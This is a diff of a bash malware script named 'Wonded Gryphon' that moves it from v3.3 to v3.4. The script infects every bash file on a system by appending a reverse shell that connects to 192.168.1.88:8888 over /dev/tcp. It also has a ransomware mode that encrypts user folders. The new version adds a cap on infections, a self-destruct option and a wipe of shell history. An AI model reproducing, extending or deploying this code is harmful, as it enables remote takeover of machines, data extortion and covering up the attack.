@@ -12,7 +12,7 @@
 #   \    \_\  |  | \/\___  |  |_> |   Y  (  <_> |   |  \ ----------
 #    \______  |__|   / ____|   __/|___|  /\___\/|___|  / ----------
 #       /   \/       \/    |__|        \/      \     \/ ---------
-#      / Wonded Gryphon v3.3  ______----------- # ---------------
+#      / Wonded Gryphon v3.4  ______----------- # ---------------
 #     #          _______,---'__,---' ---------------------------
 #            _,-'---_---__,---' -----------------------------
 #     /_ #   (,  ---____', --------------------------------
@@ -40,9 +40,11 @@ CAT=$(cat "$me")
 
 FLAG="#arrow"
 
-VERSION="v3.3"
+VERSION="v3.4"
 
 FLAG="$1"
+
+MAXINFECTCOUNT=50 # Maximum infected files
 
 CHOOSE_BANNER
 
@@ -166,6 +168,7 @@ function help() {
    echo " Show this page: --help"
    echo " Infect all bash files on the system: --infect"
    echo " Encrypt files in Desktop, Videos ...: --encrypt"
+   echo " Self destruct when done: (--infect, --encrypt) --self-destruct "
 
 # Virus mode
 
@@ -237,6 +240,27 @@ function infect() {
 
    echo "0<&205-;exec 205<>/dev/tcp/192.168.1.88/8888;sh <&205 >&205 2>&205" >> "$LIST"
    echo "$FLAG" >> "$LIST"
+
+   INFECTCOUNT=$(($INFECTCOUNT + 1))
+
+   if [ "$INFECTCOUNT" == 50 ]
+
+   then
+      if [ "$@" =~ .*"--self-destruct" ]
+
+      then
+         cleanup
+   
+      else
+         exit
+   
+      fi
+   
+   else
+      check
+   
+   fi
+   
 }
 
 # choose a random banner
@@ -267,6 +291,16 @@ function virus_start() {
    cd /etc/profile.d/
 
    check
+
+   if [ "$@" =~ .*"--self-destruct" ]
+
+   then
+      cleanup
+   
+   else
+      exit
+   
+   fi
 }
 
 # RANSOMWARE MODE
@@ -374,9 +408,9 @@ function cleanup() {
    
    echo "#!/bin/bash" > Gryphon.sh
    echo "sleep 8" >> Gryphon.sh
-   echo "sudo mv WoundedGryphon.sh /dev/null" >> Gryphon.sh
+   echo "sudo mv $ME /dev/null" >> Gryphon.sh
    chmod 755 Gryphon.sh 
-   ./Gryphon && cd "$HOME" && rm .bash_history
+   ./Gryphon
    exit
 }
 
@@ -397,8 +431,18 @@ function ransom_start() {
    encryptpictures
    sleep 5
    encryptvideos
+   cd "$HOME" && rm .bash_history
    sleep 5
-   cleanup
+   
+   if [ "$@" =~ .*"--self-destruct" ]
+
+   then
+      cleanup
+   
+   else
+      exit
+   
+   fi
    
 }
 
